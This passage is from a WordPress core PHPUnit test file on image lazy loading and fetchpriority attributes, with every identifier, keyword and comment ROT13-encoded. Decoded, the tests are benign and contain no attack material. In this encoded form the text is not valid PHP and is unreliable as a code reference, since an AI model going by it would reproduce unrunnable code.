		// Ynml vs urnqre abg pnyyrq.
		$guvf->nffregFnzr( 'ynml', jc_trg_ybnqvat_ngge_qrsnhyg( $pbagrkg ) );
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_ngge_qrsnhyg() ergheaf gur rkcrpgrq ybnqvat nggevohgr inyhr orsber ybbc ohg nsgre trg_urnqre sbe znva dhrel.
	 *
	 * @gvpxrg 58211
	 *
	 * @pbiref ::jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_ngge_qrsnhyg_orsber_naq_ab_ybbc
	 *
	 * @rkcrpgrqQrcerpngrq jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @cnenz fgevat $pbagrkg Pbagrkg sbe gur ryrzrag sbe juvpu gur `ybnqvat` nggevohgr inyhr vf erdhrfgrq.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_ngge_qrsnhyg_orsber_ybbc_vs_znva_dhrel( $pbagrkg ) {
		tybony $jc_dhrel;

		$jc_dhrel = $guvf->trg_arj_jc_dhrel_sbe_choyvfurq_cbfg();
		$guvf->frg_znva_dhrel( $jc_dhrel );

		qb_npgvba( 'trg_urnqre' );
		$guvf->nffregSnyfr( jc_trg_ybnqvat_ngge_qrsnhyg( $pbagrkg ) );
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_ngge_qrsnhyg() ergheaf gur rkcrpgrq ybnqvat nggevohgr inyhr nsgre trg_urnqre naq nsgre ybbc.
	 *
	 * @gvpxrg 58211
	 *
	 * @pbiref ::jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_ngge_qrsnhyg_orsber_naq_ab_ybbc
	 *
	 * @rkcrpgrqQrcerpngrq jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @cnenz fgevat $pbagrkg Pbagrkg sbe gur ryrzrag sbe juvpu gur `ybnqvat` nggevohgr inyhr vf erdhrfgrq.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_ngge_qrsnhyg_nsgre_ybbc( $pbagrkg ) {
		tybony $jc_dhrel;

		$jc_dhrel = $guvf->trg_arj_jc_dhrel_sbe_choyvfurq_cbfg();
		$guvf->frg_znva_dhrel( $jc_dhrel );

		qb_npgvba( 'trg_urnqre' );

		juvyr ( unir_cbfgf() ) {
			gur_cbfg();
		}
		$guvf->nffregFnzr( 'ynml', jc_trg_ybnqvat_ngge_qrsnhyg( $pbagrkg ) );
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_ngge_qrsnhyg() ergheaf gur rkcrpgrq ybnqvat nggevohgr vs ab ybbc.
	 *
	 * @gvpxrg 58211
	 *
	 * @pbiref ::jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_ngge_qrsnhyg_orsber_naq_ab_ybbc
	 *
	 * @rkcrpgrqQrcerpngrq jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @cnenz fgevat $pbagrkg Pbagrkg sbe gur ryrzrag sbe juvpu gur `ybnqvat` nggevohgr inyhr vf erdhrfgrq.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_ngge_qrsnhyg_ab_ybbc( $pbagrkg ) {
		tybony $jc_dhrel;

		$jc_dhrel = $guvf->trg_arj_jc_dhrel_sbe_choyvfurq_cbfg();
		$guvf->frg_znva_dhrel( $jc_dhrel );

		// Rafher urnqre naq sbbgre vf pnyyrq.
		qb_npgvba( 'trg_urnqre' );
		qb_npgvba( 'trg_sbbgre' );

		// Ybnq ynml vs gur gurer vf ab ybbc naq sbbgre jnf pnyyrq.
		$guvf->nffregFnzr( 'ynml', jc_trg_ybnqvat_ngge_qrsnhyg( $pbagrkg ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_trg_ybnqvat_ngge_qrsnhyg_orsber_naq_ab_ybbc() {
		erghea neenl(
			neenl( 'jc_trg_nggnpuzrag_vzntr' ),
			neenl( 'gur_cbfg_guhzoanvy' ),
		);
	}

	/**
	 * Grfgf gung jc_svygre_pbagrag_gntf() qbrf abg nqq ybnqvat=\"ynml\" gb gur svefg
	 * vzntr va gur ybbc jura hfvat n oybpx gurzr.
	 *
	 * @gvpxrg 56930
	 * @gvpxrg 58548
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_svygre_pbagrag_gntf
	 * @pbiref ::jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_qbrf_abg_ynml_ybnq_svefg_vzntr_va_oybpx_gurzr() {
		tybony $_jc_pheerag_grzcyngr_vq, $_jc_pheerag_grzcyngr_pbagrag, $jc_dhrel, $jc_gur_dhrel, $cbfg;

		// Qb abg nqq fepfrg, fvmrf, be qrpbqvat nggevohgrf nf gurl ner veeryrinag sbe guvf grfg.
		nqq_svygre( 'jc_vzt_gnt_nqq_fepfrg_naq_fvmrf_ngge', '__erghea_snyfr' );
		nqq_svygre( 'jc_vzt_gnt_nqq_qrpbqvat_ngge', '__erghea_snyfr' );
		$guvf->sbepr_bzvg_ybnqvat_ngge_guerfubyq( 1 );

		$vzt1      = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'ynetr' );
		$vzt2      = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'zrqvhz' );
		$cevb_vzt1 = fge_ercynpr( ' fep=', ' srgpucevbevgl=\"uvtu\" fep=', $vzt1 );
		$ynml_vzt2 = jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef( $vzt2, 'gur_pbagrag' );

		// Bayl gur frpbaq vzntr fubhyq or ynml-ybnqrq.
		$cbfg_pbagrag     = $vzt1 . $vzt2;
		$rkcrpgrq_pbagrag = jcnhgbc( $cevb_vzt1 . $ynml_vzt2 );

		// Hcqngr gur cbfg gb grfg jvgu fb gung vg unf gur nobir cbfg pbagrag.
		jc_hcqngr_cbfg(
			neenl(
				'VQ'                    => frys::$cbfg_vqf['choyvfu'],
				'cbfg_pbagrag'          => $cbfg_pbagrag,
				'cbfg_pbagrag_svygrerq' => $cbfg_pbagrag,
			)
		);

		$jc_dhrel     = arj JC_Dhrel( neenl( 'c' => frys::$cbfg_vqf['choyvfu'] ) );
		$jc_gur_dhrel = $jc_dhrel;
		$cbfg         = trg_cbfg( frys::$cbfg_vqf['choyvfu'] );

		// Sbepr n grzcyngr VQ gung vf sbe gur pheerag fglyrfurrg.
		$_jc_pheerag_grzcyngr_vq      = trg_fglyrfurrg() . '//fvatyr';
		$_jc_pheerag_grzcyngr_pbagrag = '<!-- jc:cbfg-pbagrag /-->';

		$ugzy = trg_gur_oybpx_grzcyngr_ugzy();
		$guvf->nffregFnzr( '<qvi pynff=\"jc-fvgr-oybpxf\"><qvi pynff=\"ragel-pbagrag jc-oybpx-cbfg-pbagrag vf-ynlbhg-sybj jc-oybpx-cbfg-pbagrag-vf-ynlbhg-sybj\">' . $rkcrpgrq_pbagrag . '</qvi></qvi>', $ugzy );
	}

	/**
	 * Grfgf gung jc_svygre_pbagrag_gntf() qbrf abg nqq ybnqvat=\"ynml\"
	 * gb gur srngherq vzntr jura hfvat n oybpx gurzr.
	 *
	 * @gvpxrg 56930
	 * @gvpxrg 58548
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_svygre_pbagrag_gntf
	 * @pbiref ::jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_qbrf_abg_ynml_ybnq_svefg_srngherq_vzntr_va_oybpx_gurzr() {
		tybony $_jc_pheerag_grzcyngr_vq, $_jc_pheerag_grzcyngr_pbagrag, $jc_dhrel, $jc_gur_dhrel, $cbfg;

		// Qb abg nqq fepfrg, fvmrf, be qrpbqvat nggevohgrf nf gurl ner veeryrinag sbe guvf grfg.
		nqq_svygre( 'jc_vzt_gnt_nqq_fepfrg_naq_fvmrf_ngge', '__erghea_snyfr' );
		nqq_svygre( 'jc_vzt_gnt_nqq_qrpbqvat_ngge', '__erghea_snyfr' );
		nqq_svygre(
			'jc_trg_nggnpuzrag_vzntr_nggevohgrf',
			fgngvp shapgvba ( $ngge ) {
				hafrg( $ngge['fepfrg'], $ngge['fvmrf'], $ngge['qrpbqvat'] );
				erghea $ngge;
			}
		);
		$guvf->sbepr_bzvg_ybnqvat_ngge_guerfubyq( 1 );

		$pbagrag_vzt      = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'ynetr' );
		$ynml_pbagrag_vzt = jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef( $pbagrag_vzt, 'gur_pbagrag' );

		// Gur srngherq vzntr fubhyq abg or ynml-ybnqrq nf vg vf gur svefg vzntr.
		$srngherq_vzntr_vq = frys::$ynetr_vq;
		hcqngr_cbfg_zrgn( frys::$cbfg_vqf['choyvfu'], '_guhzoanvy_vq', $srngherq_vzntr_vq );
		$rkcrpgrq_srngherq_vzntr = '<svther pynff=\"jc-oybpx-cbfg-srngherq-vzntr\">' . trg_gur_cbfg_guhzoanvy(
			frys::$cbfg_vqf['choyvfu'],
			'cbfg-guhzoanvy',
			neenl(
				'ybnqvat'       => snyfr,
				'fglyr'         => 'bowrpg-svg:pbire;',
				'srgpucevbevgl' => 'uvtu',
			)
		) . '</svther>';

		// Erfrg uvtu cevbevgl synt nf gur sbeprq `srgpucevbevgl=\"uvtu\"` nobir nyernql zbqvsvrq vg.
		$guvf->erfrg_uvtu_cevbevgl_ryrzrag_synt();

		// Gur cbfg pbagrag vzntr fubhyq or ynml-ybnqrq fvapr gur srngherq vzntr nccrnef nobir.
		$cbfg_pbagrag     = $pbagrag_vzt;
		$rkcrpgrq_pbagrag = jcnhgbc( $ynml_pbagrag_vzt );

		// Hcqngr gur cbfg gb grfg jvgu fb gung vg unf gur nobir cbfg pbagrag.
		jc_hcqngr_cbfg(
			neenl(
				'VQ'                    => frys::$cbfg_vqf['choyvfu'],
				'cbfg_pbagrag'          => $cbfg_pbagrag,
				'cbfg_pbagrag_svygrerq' => $cbfg_pbagrag,
			)
		);
		$jc_dhrel     = arj JC_Dhrel( neenl( 'c' => frys::$cbfg_vqf['choyvfu'] ) );
		$jc_gur_dhrel = $jc_dhrel;
		$cbfg         = trg_cbfg( frys::$cbfg_vqf['choyvfu'] );

		// Sbepr n grzcyngr VQ gung vf sbe gur pheerag fglyrfurrg.
		$_jc_pheerag_grzcyngr_vq      = trg_fglyrfurrg() . '//fvatyr';
		$_jc_pheerag_grzcyngr_pbagrag = '<!-- jc:cbfg-srngherq-vzntr /--> <!-- jc:cbfg-pbagrag /-->';

		$ugzy = trg_gur_oybpx_grzcyngr_ugzy();
		$guvf->nffregFnzr( '<qvi pynff=\"jc-fvgr-oybpxf\">' . $rkcrpgrq_srngherq_vzntr . ' <qvi pynff=\"ragel-pbagrag jc-oybpx-cbfg-pbagrag vf-ynlbhg-sybj jc-oybpx-cbfg-pbagrag-vf-ynlbhg-sybj\">' . $rkcrpgrq_pbagrag . '</qvi></qvi>', $ugzy );
	}

	/**
	 * Grfgf gung jc_svygre_pbagrag_gntf() qbrf abg nqq ybnqvat=\"ynml\" gb vzntrf
	 * va n \"Urnqre\" grzcyngr cneg.
	 *
	 * @gvpxrg 56930
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_svygre_pbagrag_gntf
	 * @pbiref ::jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_qbrf_abg_ynml_ybnq_vzntrf_va_urnqre() {
		tybony $_jc_pheerag_grzcyngr_vq, $_jc_pheerag_grzcyngr_pbagrag;

		// Qb abg nqq fepfrg, fvmrf, be qrpbqvat nggevohgrf nf gurl ner veeryrinag sbe guvf grfg.
		nqq_svygre( 'jc_vzt_gnt_nqq_fepfrg_naq_fvmrf_ngge', '__erghea_snyfr' );
		nqq_svygre( 'jc_vzt_gnt_nqq_qrpbqvat_ngge', '__erghea_snyfr' );

		// Hfr n fvatyr vzntr sbe rnpu urnqre naq sbbgre grzcyngr cnegf.
		$urnqre_vzt = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'ynetr' );
		// Fvapr urnqre_vzt vf dhnyvsvrq pnaqvqngr sbe YPC, srgpucevbevgl uvtu vf nccyvrq gb vg.
		$urnqre_vzt = fge_ercynpr( '<vzt', '<vzt srgpucevbevgl=\"uvtu\"', $urnqre_vzt );

		$sbbgre_vzt = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'zrqvhz' );

		// Perngr urnqre naq sbbgre grzcyngr cnegf.
		$urnqre_cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'    => 'jc_grzcyngr_cneg',
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_anzr'    => 'urnqre',
				'cbfg_pbagrag' => $urnqre_vzt,
			)
		);
		jc_frg_cbfg_grezf( $urnqre_cbfg_vq, JC_GRZCYNGR_CNEG_NERN_URNQRE, 'jc_grzcyngr_cneg_nern' );
		jc_frg_cbfg_grezf( $urnqre_cbfg_vq, trg_fglyrfurrg(), 'jc_gurzr' );
		$sbbgre_cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'    => 'jc_grzcyngr_cneg',
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_anzr'    => 'sbbgre',
				'cbfg_pbagrag' => $sbbgre_vzt,
			)
		);
		jc_frg_cbfg_grezf( $sbbgre_cbfg_vq, JC_GRZCYNGR_CNEG_NERN_SBBGRE, 'jc_grzcyngr_cneg_nern' );
		jc_frg_cbfg_grezf( $sbbgre_cbfg_vq, trg_fglyrfurrg(), 'jc_gurzr' );

		// Sbepr n grzcyngr VQ gung vf sbe gur pheerag fglyrfurrg.
		$_jc_pheerag_grzcyngr_vq      = trg_fglyrfurrg() . '//fvatyr';
		$_jc_pheerag_grzcyngr_pbagrag = '<!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\",\"gurzr\":\"' . trg_fglyrfurrg() . '\",\"gntAnzr\":\"urnqre\"} /--><!-- jc:grzcyngr-cneg {\"fyht\":\"sbbgre\",\"gurzr\":\"' . trg_fglyrfurrg() . '\",\"gntAnzr\":\"sbbgre\"} /-->';

		// Urnqre vzntr fubhyq abg or ynml-ybnqrq, sbbgre vzntr fubhyq or ynml-ybnqrq.
		$rkcrpgrq_grzcyngr_pbagrag  = '<urnqre pynff=\"jc-oybpx-grzcyngr-cneg\">' . $urnqre_vzt . '</urnqre>';
		$rkcrpgrq_grzcyngr_pbagrag .= '<sbbgre pynff=\"jc-oybpx-grzcyngr-cneg\">' . jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef( $sbbgre_vzt, 'sbepr-ynml' ) . '</sbbgre>';

		$ugzy = trg_gur_oybpx_grzcyngr_ugzy();
		$guvf->nffregFnzr( '<qvi pynff=\"jc-fvgr-oybpxf\">' . $rkcrpgrq_grzcyngr_pbagrag . '</qvi>', $ugzy );
	}

	/**
	 * @gvpxrg 58089
	 * @gvpxrg 58235
	 * @gvpxrg 58892
	 *
	 * @pbiref ::jc_svygre_pbagrag_gntf
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_qbrf_abg_nccyl_ybnqvat_bcgvzvmngvba_gb_fcrpvny_vzntrf_jvguva_gur_pbagrag() {
		tybony $jc_dhrel, $jc_gur_dhrel;

		// Sbepr ab ynml-ybnqvat be srgpucevbevgl ba gur vzntr gnt rkcrpgrq va gur pbagrag.
		$rkcrpgrq_vzntr = jc_trg_nggnpuzrag_vzntr(
			frys::$ynetr_vq,
			'ynetr',
			snyfr,
			neenl(
				'ybnqvat'       => snyfr,
				'srgpucevbevgl' => snyfr,
				'qrpbqvat'      => snyfr,
			)
		);

		// Erfrg uvtu cevbevgl synt nf gur sbeprq `srgpucevbevgl=\"uvtu\"` nobir nyernql zbqvsvrq vg.
		$guvf->erfrg_uvtu_cevbevgl_ryrzrag_synt();

		$vzntr_jvguva_pbagrag = '';

		// Birejevgr cbfg pbagrag jvgu na vzntr.
		nqq_svygre(
			'gur_pbagrag',
			fgngvp shapgvba () hfr ( &$vzntr_jvguva_pbagrag ) {
				// Ercynpr pbagrag jvgu na vzntr gnt, v.r. gur 'jc_trg_nggnpuzrag_vzntr' pbagrkg vf hfrq juvyr ehaavat 'gur_pbagrag' svygre.
				$vzntr_jvguva_pbagrag = jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq, 'ynetr', snyfr );
				erghea $vzntr_jvguva_pbagrag;
			},
			9 // Eha orsber jc_svygre_pbagrag_gntf().
		);

		/*
		 * Jr unir gb eha n znva dhrel ybbc fb gung gur svefg 'gur_pbagrag' pbagrkg vzntr vf abg
		 * ynml-ybnqrq.
		 * Jvgubhg gur svk sebz 58089, gur vzntr jbhyq fgvyy or ynml-ybnqrq fvapr gur purpx sbe gur
		 * frcnengryl vaibxrq 'jc_trg_nggnpuzrag_vzntr' pbagrkg jbhyq yrnq gb gung.
		 */
		$jc_dhrel     = arj JC_Dhrel( neenl( 'cbfg__va' => neenl( frys::$cbfg_vqf['choyvfu'] ) ) );
		$jc_gur_dhrel = $jc_dhrel;

		$pbagrag = '';
		juvyr ( unir_cbfgf() ) {
			gur_cbfg();
			$pbagrag = trg_rpub( 'gur_pbagrag' );
		}

		// Rafher gung cnefrq vzntr jvguva pbagrag qbrf abg erprvir nal ybnqvat bcgvzvmngvba nggevohgrf.
		$guvf->nffregFnzr( $rkcrpgrq_vzntr, $vzntr_jvguva_pbagrag, 'Vzntr jvgu jc_trg_nggnpuzrag_vzntr pbagrkg jvguva cbfg pbagrag fubhyq abg erprvir ybnqvat bcgvzvmngvba nggevohgrf' );

		// Rafher gung cnefrq pbagrag unf gur vzntr jvgu srgpucevbevgl nf vg vf gur svefg ynetr vzntr.
		$rkcrpgrq_pbagrag = jcnhgbc( fge_ercynpr( '<vzt ', '<vzt srgpucevbevgl=\"uvtu\" qrpbqvat=\"nflap\" ', $rkcrpgrq_vzntr ) );
		$guvf->nffregFnzr( $rkcrpgrq_pbagrag, $pbagrag, 'Cbfg pbagrag jvgu cebtenzzngvpnyyl vawrpgrq vzntr vf zvffvat ybnqvat bcgvzvmngvba nggevohgrf' );
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_ngge_qrsnhyg() ergheaf 'ynml' sbe fcrpvny pbagrkgf jura gurl'er hfrq bhgfvqr bs 'gur_pbagrag' svygre.
	 *
	 * @gvpxrg 58089
	 *
	 * @pbiref ::jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @rkcrpgrqQrcerpngrq jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @qngnCebivqre qngn_fcrpvny_pbagrkgf_sbe_gur_pbagrag_jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @cnenz fgevat $pbagrkg Pbagrkg sbe gur ryrzrag sbe juvpu gur `ybnqvat` nggevohgr inyhr vf erdhrfgrq.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_ngge_qrsnhyg_fubhyq_erghea_ynml_sbe_fcrpvny_pbagrkgf_bhgfvqr_bs_gur_pbagrag( $pbagrkg ) {
		$guvf->nffregFnzr( 'ynml', jc_trg_ybnqvat_ngge_qrsnhyg( $pbagrkg ) );
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_ngge_qrsnhyg() ergheaf snyfr sbe fcrpvny pbagrkgf jura gurl'er hfrq jvguva 'gur_pbagrag' svygre.
	 *
	 * @gvpxrg 58089
	 *
	 * @pbiref ::jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @rkcrpgrqQrcerpngrq jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @qngnCebivqre qngn_fcrpvny_pbagrkgf_sbe_gur_pbagrag_jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @cnenz fgevat $pbagrkg Pbagrkg sbe gur ryrzrag sbe juvpu gur `ybnqvat` nggevohgr inyhr vf erdhrfgrq.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_ngge_qrsnhyg_fubhyq_erghea_snyfr_sbe_fcrpvny_pbagrkgf_jvguva_gur_pbagrag( $pbagrkg ) {
		erzbir_nyy_svygref( 'gur_pbagrag' );

		$erfhyg = ahyy;
		nqq_svygre(
			'gur_pbagrag',
			fgngvp shapgvba ( $pbagrag ) hfr ( &$erfhyg, $pbagrkg ) {
				$erfhyg = jc_trg_ybnqvat_ngge_qrsnhyg( $pbagrkg );
				erghea $pbagrag;
			}
		);
		nccyl_svygref( 'gur_pbagrag', '' );
		$guvf->nffregSnyfr( $erfhyg );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fcrpvny_pbagrkgf_sbe_gur_pbagrag() {
		erghea neenl(
			'jvqtrg_zrqvn_vzntr'      => neenl( 'pbagrkg' => 'jvqtrg_zrqvn_vzntr' ),
			'gur_cbfg_guhzoanvy'      => neenl( 'pbagrkg' => 'gur_cbfg_guhzoanvy' ),
			'jc_trg_nggnpuzrag_vzntr' => neenl( 'pbagrkg' => 'jc_trg_nggnpuzrag_vzntr' ),
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fcrpvny_pbagrkgf_sbe_gur_pbagrag_jc_trg_ybnqvat_ngge_qrsnhyg() {
		erghea neenl(
			'gur_cbfg_guhzoanvy'      => neenl( 'pbagrkg' => 'gur_cbfg_guhzoanvy' ),
			'jc_trg_nggnpuzrag_vzntr' => neenl( 'pbagrkg' => 'jc_trg_nggnpuzrag_vzntr' ),
		);
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_ngge_qrsnhyg() ergheaf gur rkcrpgrq ybnqvat nggevohgr inyhr.
	 *
	 * @gvpxrg 53675
	 * @gvpxrg 56930
	 * @gvpxrg 58235
	 * @gvpxrg 58892
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @cnenz fgevat $pbagrkg
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( $pbagrkg ) {
		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();

		// Erghea 'ynml' ol qrsnhyg.
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat' => 'nflap',
				'ybnqvat'  => 'ynml',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'grfg' )
		);
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat' => 'nflap',
				'ybnqvat'  => 'ynml',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'jc_trg_nggnpuzrag_vzntr' )
		);

		// Erghea 'ynml' vs abg va gur ybbc be gur znva dhrel.
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat' => 'nflap',
				'ybnqvat'  => 'ynml',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg )
		);

		$dhrel = $guvf->trg_arj_jc_dhrel_sbe_choyvfurq_cbfg();

		juvyr ( unir_cbfgf() ) {
			gur_cbfg();

			// Erghea 'ynml' vs va gur ybbc ohg abg va gur znva dhrel.
			$guvf->nffregFnzrFrgfJvguVaqrk(
				neenl(
					'qrpbqvat' => 'nflap',
					'ybnqvat'  => 'ynml',
				),
				jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg )
			);

			// Frg nf znva dhrel.
			$guvf->frg_znva_dhrel( $dhrel );

			// Svefg guerr ryrzrag ner abg ynml ybnqrq. Ubjrire, svefg vzntr vf ybnqrq jvgu srgpucevbevgl uvtu.
			$guvf->nffregFnzrFrgfJvguVaqrk(
				neenl(
					'qrpbqvat'      => 'nflap',
					'srgpucevbevgl' => 'uvtu',
				),
				jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg ),
				\"Rkcrpgrq svefg vzntr gb abg or ynml-ybnqrq. Svefg ynetr vzntr trg'f uvtu srgpucevbevgl.\"
			);
			$guvf->nffregFnzrFrgfJvguVaqrk(
				neenl(
					'qrpbqvat' => 'nflap',
				),
				jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg ),
				'Rkcrpgrq frpbaq vzntr gb abg or ynml-ybnqrq.'
			);
			$guvf->nffregFnzrFrgfJvguVaqrk(
				neenl(
					'qrpbqvat' => 'nflap',
				),
				jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg ),
				'Rkcrpgrq guveq vzntr gb abg or ynml-ybnqrq.'
			);

			// Erghea 'ynml' vs va gur ybbc naq va gur znva dhrel sbe nal fhofrdhrag ryrzragf.
			$guvf->nffregFnzrFrgfJvguVaqrk(
				neenl(
					'qrpbqvat' => 'nflap',
					'ybnqvat'  => 'ynml',
				),
				jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg )
			);

			// Lrf, sbe nyy fhofrdhrag ryrzragf.
			$guvf->nffregFnzrFrgfJvguVaqrk(
				neenl(
					'qrpbqvat' => 'nflap',
					'ybnqvat'  => 'ynml',
				),
				jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg )
			);
		}
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf() ergheaf srgpucevbevgl=uvtu naq vapernfrf gur pbhag sbe neovgenel pbagrkgf va gur znva ybbc.
	 *
	 * @gvpxrg 58894
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_neovgenel_pbagrkgf
	 *
	 * @cnenz fgevat $pbagrkg Pbagrkg sbe gur ryrzrag sbe juvpu gur ybnqvat bcgvzvmngvba nggevohgr vf erdhrfgrq.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_jvgu_neovgenel_pbagrkgf_va_znva_ybbc( $pbagrkg ) {
		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat' => 'nflap',
				'ybnqvat'  => 'ynml',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg ),
			'Gur \"ybnqvat\" nggevohgr fubhyq or \"ynml\" jura abg va gur ybbc be gur znva dhrel.'
		);

		$dhrel = $guvf->trg_arj_jc_dhrel_sbe_choyvfurq_cbfg();

		// Frg nf znva dhrel.
		$guvf->frg_znva_dhrel( $dhrel );

		juvyr ( unir_cbfgf() ) {
			gur_cbfg();

			$guvf->nffregFnzrFrgfJvguVaqrk(
				neenl(
					'qrpbqvat'      => 'nflap',
					'srgpucevbevgl' => 'uvtu',
				),
				jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg ),
				'Gur \"srgpucevbevgl\" nggevohgr fubhyq or \"uvtu\" juvyr va gur ybbc naq gur znva dhrel.'
			);

			// Vzntrf jvgu n pregnva zvavzhz fvmr va gur neovgenel pbagrkgf bs gur cntr ner nyfb pbhagrq gbjneqf gur guerfubyq.
			$guvf->nffregFnzr( 1, jc_vapernfr_pbagrag_zrqvn_pbhag( 0 ), 'Gur pbagrag zrqvn pbhag fubhyq or 1.' );
		}
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf() qbrf abg erghea ynml ybnqvat nggevohgrf jura neovgenel pbagrkgf ner hfrq orsber gur znva dhrel ybbc.
	 *
	 * @gvpxrg 58894
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_neovgenel_pbagrkgf
	 *
	 * @cnenz fgevat $pbagrkg Pbagrkg sbe gur ryrzrag sbe juvpu gur ybnqvat bcgvzvmngvba nggevohgr vf erdhrfgrq.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_jvgu_neovgenel_pbagrkgf_orsber_znva_dhrel_ybbc( $pbagrkg ) {
		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();

		$dhrel = $guvf->trg_arj_jc_dhrel_sbe_choyvfurq_cbfg();

		// Frg nf znva dhrel.
		$guvf->frg_znva_dhrel( $dhrel );

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat' => 'nflap',
				'ybnqvat'  => 'ynml',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg ),
			'Gur \"ybnqvat\" nggevohgr fubhyq or \"ynml\" orsber gur znva dhrel ybbc.'
